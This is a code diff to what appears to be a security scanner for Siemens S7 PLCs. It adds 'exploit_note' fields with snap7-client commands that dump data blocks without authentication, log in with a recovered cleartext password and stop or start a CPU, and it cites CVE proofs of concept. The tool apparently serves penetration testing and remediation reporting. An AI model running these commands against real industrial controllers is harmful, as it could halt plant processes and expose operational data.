@@ -543,10 +543,12 @@ def s7_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "snap7 / plcscan", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -576,7 +578,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "industrial firewall. If IT-to-OT reachability is required, "
                     "front the CPU with a Siemens SCALANCE S / equivalent DPI "
                     "gateway and restrict source IPs.",
-                    ["CWE-923", "CWE-1188"], kind="s7_reachable"))
+                    ["CWE-923", "CWE-1188"], kind="s7_reachable",
+                    exploit_note=(
+                        "plcscan -p 102 <ip>; snap7-client -h <ip> -c connect "
+                        "-R 0 -S 2 (rack 0 slot 2 = classic S7-300/400 CPU "
+                        "location)."),
+                    depth_tier="t1"))
 
             # COTP-only (no S7 stack behind it — rare but real).
             if pr.get("cotp_reachable") and not pr.get("s7_stack") \
@@ -652,7 +659,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "The order code is intentionally exposed by the protocol "
                     "but should not be reachable from untrusted networks. "
                     "Segment the CPU.",
-                    ["CWE-200"], kind="s7_module_identification"))
+                    ["CWE-200"], kind="s7_module_identification",
+                    exploit_note=(
+                        "MLFB decoded — search Siemens ProductCERT + "
+                        "siemens.com/cert-services for MLFB prefix; consult "
+                        "CVE-2015-2177/CVE-2016-9159 for 6ES73* CPUs."),
+                    depth_tier="t0"))
 
             comp = pr.get("component") or {}
             comp_fields = [(k, v) for k, v in comp.items() if v]
@@ -687,7 +699,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "properties → Protection & Security. S7-300/400: enable "
                     "protection level 2 or 3 and set a password. In all cases "
                     "restrict access to a management VLAN.",
-                    ["CWE-306", "CWE-923"], kind="s7_put_get_enabled"))
+                    ["CWE-306", "CWE-923"], kind="s7_put_get_enabled",
+                    exploit_note=(
+                        "snap7-client -h <ip> -c getvar -a M -s 0 -n 1; then "
+                        "enumerate DBs: snap7-client -c listblocks; snap7-client "
+                        "-c getvar -a DB -d 1 -s 0 -n 16 — dump plant "
+                        "recipes/setpoints without auth."),
+                    depth_tier="t1"))
 
             if pr.get("read_var_ok"):
                 out.append(_finding(
@@ -702,7 +720,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable PUT/GET (S7-1200/1500) or set protection level 3 "
                     "with a strong password (S7-300/400). Segment the CPU off "
                     "the IT network.",
-                    ["CWE-306"], kind="s7_read_var_ok"))
+                    ["CWE-306"], kind="s7_read_var_ok",
+                    exploit_note=(
+                        "snap7-client -h <ip> -c getvar -a DB -d <n> -s 0 -n 256 "
+                        "for each DB from the block list; snap7-client -h <ip> "
+                        "-c dbget -d 1 (full DB1 dump) — expect process "
+                        "setpoints, recipes, alarms."),
+                    depth_tier="t2"))
 
             lvl = pr.get("protection_level")
             if lvl == 1:
@@ -715,7 +739,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"snap7-client -h {h.ip} -c szl -i 0x0232 -x 0x0004",
                     "Set protection level 2 (write-protect) or 3 (read+write "
                     "protect) with a strong password in the CPU properties.",
-                    ["CWE-284", "CWE-306"], kind="s7_protection_level"))
+                    ["CWE-284", "CWE-306"], kind="s7_protection_level",
+                    exploit_note=(
+                        "snap7-client -h <ip> -c szl -i 0x0232 -x 4; if level=1, "
+                        "DO NOT run stop against production. Test-cell prove: "
+                        "snap7-client -h <ip> -c stop then snap7-client -c start."),
+                    depth_tier="t1"))
             elif lvl in (2, 3):
                 out.append(_finding(
                     "info", f"S7 CPU protection level = {lvl}", tgt,
@@ -743,7 +772,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Patch to the Siemens firmware release addressing SSA-"
                     "731239. Rotate the CPU password and any HMI/engineering "
                     "station account that shared it.",
-                    ["CWE-522", "CWE-327"], kind="s7_legacy_password_readout"))
+                    ["CWE-522", "CWE-327"], kind="s7_legacy_password_readout",
+                    exploit_note=(
+                        "Use the leg['cleartext_guess'] password: snap7-client "
+                        "-h <ip> -c connect --password '<CLEARTEXT>'; then "
+                        "snap7-client -c szl -i 0x0132; dump every OB with "
+                        "snap7-client -c blockget -t OB -n <num>; NEVER write "
+                        "OBs against production."),
+                    depth_tier="t3"))
 
             if pr.get("s7_stack"):
                 out.append(_finding(
@@ -762,7 +798,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Set protection level 3 with a strong password. On "
                     "1200/1500, keep PUT/GET disabled. Segment the CPU.",
                     ["CWE-284", "CWE-770", "CWE-1247"],
-                    kind="s7_stop_start_possible"))
+                    kind="s7_stop_start_possible",
+                    exploit_note=(
+                        "TEST-CELL ONLY: snap7-client -h <ip> -c stop; verify "
+                        "SF LED on CPU face; snap7-client -c start to recover. "
+                        "Never on production."),
+                    depth_tier="t1"))
 
             blocks = pr.get("blocks") or {}
             if blocks:
@@ -794,7 +835,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"{m['cve']}",
                     f"Apply the Siemens firmware release addressing "
                     f"{m['cve']}; segment the CPU regardless.",
-                    ["CWE-1395"], kind="s7_firmware_cve"))
+                    ["CWE-1395"], kind="s7_firmware_cve",
+                    exploit_note=(
+                        "Compare fw_version to Siemens ProductCERT SSA-***; "
+                        "for CVE-2016-9159 confirm password readout worked; "
+                        "for CVE-2020-15782 use TIA Portal / snap7-plus PoC "
+                        "(private) against S7-1200 <V4.5."),
+                    depth_tier="t1"))
     return out
 
 
